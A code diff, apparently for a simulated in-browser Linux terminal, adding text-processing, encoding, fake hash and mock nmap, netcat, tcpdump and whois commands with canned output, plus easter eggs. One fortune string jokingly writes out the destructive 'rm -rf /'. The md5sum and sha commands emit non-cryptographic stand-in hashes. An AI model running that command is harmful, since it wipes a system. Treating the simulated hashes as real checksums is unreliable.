+        const file = args.filter(a => !a.startsWith('-'))[0];
+
+        let content = this.pipeInput || '';
+        if (file) {
+            const resolved = this._resolvePath(file);
+            const entry = this.fs[resolved];
+            if (!entry) return `uniq: ${file}: No such file or directory`;
+            if (entry.type !== 'file') return `uniq: ${file}: Is a directory`;
+            content = entry.content || '';
+        }
+
+        if (!content) return '';
+
+        const lines = content.split('\n');
+        const result = [];
+        let prevLine = null;
+        let prevCount = 0;
+
+        for (const line of lines) {
+            if (line === prevLine) {
+                prevCount++;
+            } else {
+                if (prevLine !== null) {
+                    const isDuplicate = prevCount > 1;
+                    if ((!duplicatesOnly && !uniqueOnly) ||
+                        (duplicatesOnly && isDuplicate) ||
+                        (uniqueOnly && !isDuplicate)) {
+                        result.push(count ? `${String(prevCount).padStart(7)} ${prevLine}` : prevLine);
+                    }
+                }
+                prevLine = line;
+                prevCount = 1;
+            }
+        }
+
+        // Handle last line
+        if (prevLine !== null) {
+            const isDuplicate = prevCount > 1;
+            if ((!duplicatesOnly && !uniqueOnly) ||
+                (duplicatesOnly && isDuplicate) ||
+                (uniqueOnly && !isDuplicate)) {
+                result.push(count ? `${String(prevCount).padStart(7)} ${prevLine}` : prevLine);
+            }
+        }
+
+        return result.join('\n');
+    }
+
+    _cmdCut(args) {
+        const delimiterIdx = args.indexOf('-d');
+        const fieldIdx = args.indexOf('-f');
+        const charIdx = args.indexOf('-c');
+
+        let delimiter = '\t';
+        let fields = null;
+        let chars = null;
+
+        if (delimiterIdx !== -1 && args[delimiterIdx + 1]) {
+            delimiter = args[delimiterIdx + 1].replace(/['"]/g, '');
+        }
+        if (fieldIdx !== -1 && args[fieldIdx + 1]) {
+            fields = args[fieldIdx + 1];
+        }
+        if (charIdx !== -1 && args[charIdx + 1]) {
+            chars = args[charIdx + 1];
+        }
+
+        const file = args.filter(a => !a.startsWith('-') && !a.includes(delimiter) && !/^\d/.test(a))[0];
+
+        let content = this.pipeInput || '';
+        if (file) {
+            const resolved = this._resolvePath(file);
+            const entry = this.fs[resolved];
+            if (!entry) return `cut: ${file}: No such file or directory`;
+            if (entry.type !== 'file') return `cut: ${file}: Is a directory`;
+            content = entry.content || '';
+        }
+
+        if (!content) return '';
+
+        const lines = content.split('\n');
+        const result = [];
+
+        for (const line of lines) {
+            if (chars) {
+                // Character extraction
+                const range = this._parseRange(chars, line.length);
+                result.push(range.map(i => line[i - 1] || '').join(''));
+            } else if (fields) {
+                // Field extraction
+                const parts = line.split(delimiter);
+                const range = this._parseRange(fields, parts.length);
+                result.push(range.map(i => parts[i - 1] || '').join(delimiter));
+            } else {
+                result.push(line);
+            }
+        }
+
+        return result.join('\n');
+    }
+
+    _parseRange(spec, max) {
+        const result = [];
+        const parts = spec.split(',');
+
+        for (const part of parts) {
+            if (part.includes('-')) {
+                const [start, end] = part.split('-');
+                const s = start ? parseInt(start) : 1;
+                const e = end ? parseInt(end) : max;
+                for (let i = s; i <= Math.min(e, max); i++) {
+                    if (!result.includes(i)) result.push(i);
+                }
+            } else {
+                const n = parseInt(part);
+                if (n >= 1 && n <= max && !result.includes(n)) {
+                    result.push(n);
+                }
+            }
+        }
+
+        return result.sort((a, b) => a - b);
+    }
+
+    _cmdTr(args) {
+        if (args.length < 2) return 'tr: missing operand';
+
+        const deleteMode = args[0] === '-d';
+        const squeezeMode = args[0] === '-s';
+
+        let set1, set2;
+        if (deleteMode || squeezeMode) {
+            set1 = (args[1] || '').replace(/['"]/g, '');
+            set2 = (args[2] || '').replace(/['"]/g, '');
+        } else {
+            set1 = (args[0] || '').replace(/['"]/g, '');
+            set2 = (args[1] || '').replace(/['"]/g, '');
+        }
+
+        let content = this.pipeInput || '';
+        if (!content) return '';
+
+        // Expand character classes
+        set1 = this._expandCharClass(set1);
+        set2 = this._expandCharClass(set2);
+
+        if (deleteMode) {
+            // Delete characters in set1
+            const regex = new RegExp(`[${this._escapeRegex(set1)}]`, 'g');
+            return content.replace(regex, '');
+        } else if (squeezeMode) {
+            // Squeeze repeated characters
+            let result = content;
+            for (const char of set1) {
+                const regex = new RegExp(`${this._escapeRegex(char)}+`, 'g');
+                result = result.replace(regex, char);
+            }
+            return result;
+        } else {
+            // Translate characters
+            let result = '';
+            for (const char of content) {
+                const idx = set1.indexOf(char);
+                if (idx !== -1 && set2[idx]) {
+                    result += set2[idx] || set2[set2.length - 1] || char;
+                } else {
+                    result += char;
+                }
+            }
+            return result;
+        }
+    }
+
+    _expandCharClass(str) {
+        return str
+            .replace(/a-z/g, 'abcdefghijklmnopqrstuvwxyz')
+            .replace(/A-Z/g, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ')
+            .replace(/0-9/g, '0123456789')
+            .replace(/\\n/g, '\n')
+            .replace(/\\t/g, '\t');
+    }
+
+    _escapeRegex(str) {
+        return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+    }
+
+    _cmdSed(args) {
+        if (args.length < 1) return 'sed: no input files';
+
+        const expression = args[0].replace(/['"]/g, '');
+        const file = args.filter(a => !a.startsWith('-') && a !== expression)[0];
+
+        let content = this.pipeInput || '';
+        if (file) {
+            const resolved = this._resolvePath(file);
+            const entry = this.fs[resolved];
+            if (!entry) return `sed: can't read ${file}: No such file or directory`;
+            if (entry.type !== 'file') return `sed: ${file}: Is a directory`;
+            content = entry.content || '';
+        }
+
+        if (!content) return '';
+
+        // Parse s/pattern/replacement/flags
+        const match = expression.match(/^s\/(.+?)\/(.*)\/([gi]*)$/);
+        if (match) {
+            const [, pattern, replacement, flags] = match;
+            const regex = new RegExp(pattern, flags.includes('g') ? 'g' : '');
+
+            if (flags.includes('g')) {
+                return content.replace(regex, replacement);
+            } else {
+                // Line-by-line replacement (default sed behavior)
+                return content.split('\n').map(line =>
+                    line.replace(regex, replacement)
+                ).join('\n');
+            }
+        }
+
+        // Support d for delete
+        if (expression.match(/^\/.*\/d$/)) {
+            const pattern = expression.slice(1, -2);
+            const regex = new RegExp(pattern);
+            return content.split('\n').filter(line => !regex.test(line)).join('\n');
+        }
+
+        // Support p for print (with -n)
+        if (expression.match(/^\/.*\/p$/) && args.includes('-n')) {
+            const pattern = expression.slice(1, -2);
+            const regex = new RegExp(pattern);
+            return content.split('\n').filter(line => regex.test(line)).join('\n');
+        }
+
+        return content;
+    }
+
+    _cmdAwk(args) {
+        if (args.length < 1) return 'awk: no program given';
+
+        const fieldSepIdx = args.indexOf('-F');
+        let fieldSep = ' ';
+        if (fieldSepIdx !== -1 && args[fieldSepIdx + 1]) {
+            fieldSep = args[fieldSepIdx + 1].replace(/['"]/g, '');
+        }
+
+        const program = args.find(a => a.includes('{') || a.includes('$'))?.replace(/['"]/g, '') || args[0];
+        const file = args.filter(a => !a.startsWith('-') && !a.includes('{') && !a.includes('$') && a !== fieldSep)[0];
+
+        let content = this.pipeInput || '';
+        if (file) {
+            const resolved = this._resolvePath(file);
+            const entry = this.fs[resolved];
+            if (!entry) return `awk: can't open file ${file}`;
+            if (entry.type !== 'file') return `awk: ${file}: Is a directory`;
+            content = entry.content || '';
+        }
+
+        if (!content) return '';
+
+        const lines = content.split('\n');
+        const result = [];
+
+        // Simple awk patterns: {print $1}, {print $1, $2}, {print $0}, etc.
+        const printMatch = program.match(/\{print\s+(.+)\}/);
+        if (printMatch) {
+            const fields = printMatch[1].split(/,\s*/);
+
+            for (const line of lines) {
+                if (!line) continue;
+                const parts = line.split(fieldSep === ' ' ? /\s+/ : fieldSep);
+                const output = fields.map(f => {
+                    f = f.trim();
+                    if (f === '$0') return line;
+                    if (f === 'NF') return parts.length;
+                    if (f === 'NR') return lines.indexOf(line) + 1;
+                    const match = f.match(/^\$(\d+)$/);
+                    if (match) {
+                        const idx = parseInt(match[1]);
+                        return idx === 0 ? line : (parts[idx - 1] || '');
+                    }
+                    return f.replace(/['"]/g, '');
+                }).join(' ');
+                result.push(output);
+            }
+        } else {
+            // Just return content if pattern not understood
+            return content;
+        }
+
+        return result.join('\n');
+    }
+
+    _cmdTee(args) {
+        const append = args.includes('-a');
+        const files = args.filter(a => !a.startsWith('-'));
+
+        const content = this.pipeInput || '';
+
+        // Write to files
+        for (const file of files) {
+            const resolved = this._resolvePath(file);
+            const parentPath = resolved.substring(0, resolved.lastIndexOf('/')) || '/';
+            const fileName = resolved.substring(resolved.lastIndexOf('/') + 1);
+
+            if (this.fs[parentPath]?.type === 'dir') {
+                if (append && this.fs[resolved]) {
+                    this.fs[resolved].content = (this.fs[resolved].content || '') + content;
+                } else {
+                    this.fs[resolved] = {
+                        type: 'file',
+                        content: content,
+                        perms: '-rw-r--r--',
+                        owner: this.user,
+                        group: this.user
+                    };
+                    if (!this.fs[parentPath].children.includes(fileName)) {
+                        this.fs[parentPath].children.push(fileName);
+                    }
+                }
+            }
+        }
+
+        // Also output to stdout
+        return content;
+    }
+
+    _cmdXargs(args) {
+        const command = args[0] || 'echo';
+        const content = this.pipeInput || '';
+
+        if (!content) return '';
+
+        const items = content.split(/\s+/).filter(i => i);
+
+        // Simple xargs simulation - run command with all items as args
+        if (command === 'echo') {
+            return items.join(' ');
+        } else if (command === 'rm') {
+            for (const item of items) {
+                const resolved = this._resolvePath(item);
+                if (this.fs[resolved]) {
+                    delete this.fs[resolved];
+                }
+            }
+            return '';
+        } else {
+            // Generic handling - just show what would run
+            return `${command} ${items.join(' ')}`;
+        }
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // CRYPTO/ENCODING COMMANDS
+    // ═══════════════════════════════════════════════════════════════
+
+    _cmdBase64(args) {
+        const decode = args.includes('-d') || args.includes('--decode');
+        const file = args.filter(a => !a.startsWith('-'))[0];
+
+        let content = this.pipeInput || '';
+        if (file) {
+            const resolved = this._resolvePath(file);
+            const entry = this.fs[resolved];
+            if (!entry) return `base64: ${file}: No such file or directory`;
+            if (entry.type !== 'file') return `base64: ${file}: Is a directory`;
+            content = entry.content || '';
+        }
+
+        if (!content) return '';
+
+        try {
+            if (decode) {
+                return atob(content.trim());
+            } else {
+                return btoa(content);
+            }
+        } catch (e) {
+            return `base64: invalid input`;
+        }
+    }
+
+    _cmdMd5sum(args) {
+        const file = args.filter(a => !a.startsWith('-'))[0];
+
+        let content = this.pipeInput || '';
+        let filename = '-';
+
+        if (file) {
+            const resolved = this._resolvePath(file);
+            const entry = this.fs[resolved];
+            if (!entry) return `md5sum: ${file}: No such file or directory`;
+            if (entry.type !== 'file') return `md5sum: ${file}: Is a directory`;
+            content = entry.content || '';
+            filename = file;
+        }
+
+        // Simple hash simulation (not real MD5, but consistent for same input)
+        const hash = this._simpleHash(content, 32);
+        return `${hash}  ${filename}`;
+    }
+
+    _cmdSha256sum(args) {
+        const file = args.filter(a => !a.startsWith('-'))[0];
+
+        let content = this.pipeInput || '';
+        let filename = '-';
+
+        if (file) {
+            const resolved = this._resolvePath(file);
+            const entry = this.fs[resolved];
+            if (!entry) return `sha256sum: ${file}: No such file or directory`;
+            if (entry.type !== 'file') return `sha256sum: ${file}: Is a directory`;
+            content = entry.content || '';
+            filename = file;
+        }
+
+        const hash = this._simpleHash(content, 64);
+        return `${hash}  ${filename}`;
+    }
+
+    _cmdSha1sum(args) {
+        const file = args.filter(a => !a.startsWith('-'))[0];
+
+        let content = this.pipeInput || '';
+        let filename = '-';
+
+        if (file) {
+            const resolved = this._resolvePath(file);
+            const entry = this.fs[resolved];
+            if (!entry) return `sha1sum: ${file}: No such file or directory`;
+            if (entry.type !== 'file') return `sha1sum: ${file}: Is a directory`;
+            content = entry.content || '';
+            filename = file;
+        }
+
+        const hash = this._simpleHash(content, 40);
+        return `${hash}  ${filename}`;
+    }
+
+    _simpleHash(str, length) {
+        // Generate a consistent hex string based on input
+        let hash = 0;
+        for (let i = 0; i < str.length; i++) {
+            const char = str.charCodeAt(i);
+            hash = ((hash << 5) - hash) + char;
+            hash = hash & hash;
+        }
+
+        // Convert to hex and pad/extend to desired length
+        let hex = Math.abs(hash).toString(16);
+        while (hex.length < length) {
+            hex = hex + Math.abs(hash * (hex.length + 1)).toString(16);
+        }
+        return hex.slice(0, length);
+    }
+
+    _cmdStrings(args) {
+        const minLen = 4; // Default minimum string length
+        const file = args.filter(a => !a.startsWith('-'))[0];
+
+        if (!file) return 'strings: no file specified';
+
+        const resolved = this._resolvePath(file);
+        const entry = this.fs[resolved];
+        if (!entry) return `strings: ${file}: No such file or directory`;
+        if (entry.type !== 'file') return `strings: ${file}: Is a directory`;
+
+        const content = entry.content || '';
+
+        // Simulate finding printable strings
+        const strings = [];
+        let current = '';
+
+        for (const char of content) {
+            if (char.match(/[\x20-\x7E]/)) {
+                current += char;
+            } else {
+                if (current.length >= minLen) {
+                    strings.push(current);
+                }
+                current = '';
+            }
+        }
+
+        if (current.length >= minLen) {
+            strings.push(current);
+        }
+
+        return strings.join('\n');
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // SECURITY/RECON COMMANDS
+    // ═══════════════════════════════════════════════════════════════
+
+    _cmdNmap(args) {
+        const target = args.filter(a => !a.startsWith('-'))[0];
+        const allPorts = args.includes('-p-');
+        const serviceVersion = args.includes('-sV');
+        const osDetect = args.includes('-O');
+        const aggressive = args.includes('-A');
+
+        if (!target) return 'Nmap: No target specified';
+
+        const ports = [
+            { port: 22, state: 'open', service: 'ssh', version: 'OpenSSH 8.2p1 Ubuntu' },
+            { port: 80, state: 'open', service: 'http', version: 'Apache httpd 2.4.41' },
+            { port: 443, state: 'open', service: 'ssl/http', version: 'Apache httpd 2.4.41' },
+            { port: 3306, state: 'open', service: 'mysql', version: 'MySQL 8.0.23' },
+            { port: 8080, state: 'filtered', service: 'http-proxy', version: '' }
+        ];
+
+        let output = `Starting Nmap 7.92 ( https://nmap.org )
+Nmap scan report for ${target}
+Host is up (0.0023s latency).
+`;
+
+        if (allPorts) {
+            output += `Not shown: 65530 closed ports\n`;
+        }
+
+        output += `\nPORT     STATE    SERVICE`;
+        if (serviceVersion || aggressive) output += `     VERSION`;
+        output += `\n`;
+
+        for (const p of ports) {
+            const portStr = `${p.port}/tcp`.padEnd(9);
+            const stateStr = p.state.padEnd(9);
+            const serviceStr = p.service.padEnd(12);
+            output += `${portStr}${stateStr}${serviceStr}`;
+            if ((serviceVersion || aggressive) && p.version) {
+                output += p.version;
+            }
+            output += `\n`;
+        }
+
+        if (osDetect || aggressive) {
+            output += `
+OS details: Linux 5.15 - 5.19
+Network Distance: 1 hop`;
+        }
+
+        output += `
+Nmap done: 1 IP address (1 host up) scanned in 2.45 seconds`;
+
+        return output;
+    }
+
+    _cmdNetcat(args) {
+        const listen = args.includes('-l');
+        const verbose = args.includes('-v');
+        const port = args.filter(a => /^\d+$/.test(a))[0];
+        const host = args.filter(a => !a.startsWith('-') && !/^\d+$/.test(a))[0];
+
+        if (listen) {
+            if (!port) return 'nc: missing port number';
+            return `Listening on 0.0.0.0 ${port}`;
+        }
+
+        if (!host) return 'nc: missing host';
+        if (!port) return 'nc: missing port';
+
+        return `Connection to ${host} ${port} port [tcp/*] succeeded!`;
+    }
+
+    _cmdTcpdump(args) {
+        const interface_ = args.includes('-i') ? args[args.indexOf('-i') + 1] : 'eth0';
+        const count = args.includes('-c') ? parseInt(args[args.indexOf('-c') + 1]) : 5;
+        const verbose = args.includes('-v');
+
+        let output = `tcpdump: listening on ${interface_}, link-type EN10MB (Ethernet), capture size 262144 bytes\n`;
+
+        const packets = [
+            { time: '10:30:01.234567', src: '192.168.1.100', dst: '8.8.8.8', proto: 'UDP', info: 'DNS query' },
+            { time: '10:30:01.235123', src: '8.8.8.8', dst: '192.168.1.100', proto: 'UDP', info: 'DNS response' },
+            { time: '10:30:01.456789', src: '192.168.1.100', dst: '93.184.216.34', proto: 'TCP', info: 'SYN' },
+            { time: '10:30:01.478901', src: '93.184.216.34', dst: '192.168.1.100', proto: 'TCP', info: 'SYN-ACK' },
+            { time: '10:30:01.479012', src: '192.168.1.100', dst: '93.184.216.34', proto: 'TCP', info: 'ACK' },
+            { time: '10:30:01.512345', src: '192.168.1.100', dst: '93.184.216.34', proto: 'TCP', info: 'HTTP GET /' },
+            { time: '10:30:01.612345', src: '93.184.216.34', dst: '192.168.1.100', proto: 'TCP', info: 'HTTP 200 OK' }
+        ];
+
+        for (let i = 0; i < Math.min(count, packets.length); i++) {
+            const p = packets[i];
+            output += `${p.time} IP ${p.src} > ${p.dst}: ${p.proto} ${p.info}\n`;
+        }
+
+        output += `\n${Math.min(count, packets.length)} packets captured`;
+        return output;
+    }
+
+    _cmdWhois(args) {
+        const domain = args.filter(a => !a.startsWith('-'))[0];
+
+        if (!domain) return 'whois: missing domain';
+
+        return `Domain Name: ${domain.toUpperCase()}
+Registry Domain ID: 12345678_DOMAIN_COM-VRSN
+Registrar WHOIS Server: whois.example.com
+Registrar URL: http://www.example.com
+Updated Date: 2024-01-15T00:00:00Z
+Creation Date: 2000-01-01T00:00:00Z
+Registry Expiry Date: 2025-01-01T00:00:00Z
+Registrar: Example Registrar, Inc.
+Registrar IANA ID: 1234
+Registrar Abuse Contact Email: abuse@example.com
+Registrar Abuse Contact Phone: +1.5551234567
+Domain Status: clientTransferProhibited
+Name Server: NS1.EXAMPLE.COM
+Name Server: NS2.EXAMPLE.COM
+DNSSEC: unsigned
+>>> Last update of whois database: ${new Date().toISOString()} <<<`;
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // EASTER EGG COMMANDS
+    // ═══════════════════════════════════════════════════════════════
+
+    _cmdSl() {
+        return `
+                          (  ) (@@) ( )  (@)  ()    @@    O     @     O     @
+                     (@@@)
+                 (    )
+              (@@@@)
+            (   )
+        ====        ________                ___________
+    _D _|  |_______/        \\__I_I_____===__|_________|
+     |(_)---  |   H\\________/ |   |        =|___ ___|
+     /     |  |   H  |  |     |   |         ||_| |_||
+    |      |  |   H  |__--------------------| [___] |
+    | ________|___H__/__|_____/[][]~\\_______|       |
+    |/ |   |-----------I_____I [][] []  D   |=======|
+  __/ =| o |=-~~\\  /~~\\  /~~\\  /~~\\ ____Y___________|__
+ |/-=|___|=    ||    ||    ||    |_____/~\\___/
+  \\_/      \\O=====O=====O=====O_/      \\_/
+
+You've been trained!
+(Try typing 'ls' instead of 'sl' next time!)`;
+    }
+
+    _cmdCowsay(args) {
+        const message = args.join(' ') || 'Moo!';
+        const borderLen = message.length + 2;
+        const top = ' ' + '_'.repeat(borderLen);
+        const bottom = ' ' + '-'.repeat(borderLen);
+
+        return `${top}
+< ${message} >
+${bottom}
+        \\   ^__^
+         \\  (oo)\\_______
+            (__)\\       )\\/\\
+                ||----w |
+                ||     ||`;
+    }
+
+    _cmdFortune() {
+        const fortunes = [
+            "The best way to predict the future is to create it.",
+            "In the middle of difficulty lies opportunity.",
+            "The only way to do great work is to love what you do.",
+            "chmod 777 is not a security strategy.",
+            "There's no place like 127.0.0.1",
+            "To understand recursion, you must first understand recursion.",
+            "A good programmer is someone who looks both ways before crossing a one-way street.",
+            "Programming is like writing a book... except if you miss a single comma on page 126 the whole thing makes no sense.",
+            "The cloud is just someone else's computer.",
+            "Have you tried turning it off and on again?",
+            "rm -rf / -- The ultimate minimalist approach to system administration.",
+            "There are only 10 types of people: those who understand binary and those who don't.",
+            "I'm not lazy, I'm on energy-saving mode.",
+            "Weeks of coding can save you hours of planning.",
+            "It works on my machine!",
+            "sudo make me a sandwich"
+        ];
+        return fortunes[Math.floor(Math.random() * fortunes.length)];
+    }
+
+    _cmdCmatrix() {
+        const width = 60;
+        const height = 15;
+        let matrix = '';
+
+        for (let i = 0; i < height; i++) {
+            let row = '';
+            for (let j = 0; j < width; j++) {
+                const char = Math.random() > 0.5 ? (Math.random() > 0.5 ? '1' : '0') : ' ';
+                row += char;
+            }
+            matrix += row + '\n';
+        }
+
+        return `[Matrix rain simulation - press Ctrl+C to stop]
+${matrix}
+(In a real terminal, this would animate!)`;
+    }
+
+    _cmdFiglet(args) {
+        const text = args.join(' ') || 'Hello';
+
+        // Simple ASCII art letters
+        const letters = {
+            'H': ['#   # ', '#   # ', '##### ', '#   # ', '#   # '],
+            'E': ['##### ', '#     ', '####  ', '#     ', '##### '],
+            'L': ['#     ', '#     ', '#     ', '#     ', '##### '],
+            'O': [' ### ', '#   # ', '#   # ', '#   # ', ' ### '],
+            'W': ['#   # ', '#   # ', '# # # ', '## ## ', '#   # '],
+            'R': ['####  ', '#   # ', '####  ', '#  #  ', '#   # '],
+            'D': ['####  ', '#   # ', '#   # ', '#   # ', '####  '],
+            ' ': ['  ', '  ', '  ', '  ', '  ']
+        };
+
+        const lines = ['', '', '', '', ''];
+        for (const char of text.toUpperCase()) {
+            const art = letters[char] || letters[' '];
+            for (let i = 0; i < 5; i++) {
+                lines[i] += art[i] || '      ';
+            }
+        }
+
+        return lines.join('\n');
+    }
+
+    _cmdLolcat(args) {
+        const text = args.join(' ') || this.pipeInput || '';
+        // In a real terminal this would colorize the output
+        return `🌈 ${text} 🌈
+(In a real terminal, this would be rainbow colored!)`;
+    }
+
+    _cmdHollywood() {
+        return `
+╔════════════════════════════════════════════════════════════════╗
+║                    INITIALIZING HACK SEQUENCE                   ║
+╠════════════════════════════════════════════════════════════════╣
+║ [████████████████████████████████████████] 100% COMPLETE        ║
+║                                                                 ║
+║ > Bypassing firewall.......... OK                               ║
+║ > Decrypting passwords........ OK                               ║
+║ > Accessing mainframe......... OK                               ║
+║ > Downloading all the things.. OK                               ║
+║ > Installing backdoor......... OK                               ║
+║                                                                 ║
+║                    ★ ACCESS GRANTED ★                           ║
+║                                                                 ║
+║  Just kidding! This is just for fun.                            ║
+║  Real hacking looks like reading logs and drinking coffee.       ║
+╚════════════════════════════════════════════════════════════════╝`;
     }
 
     // Public methods
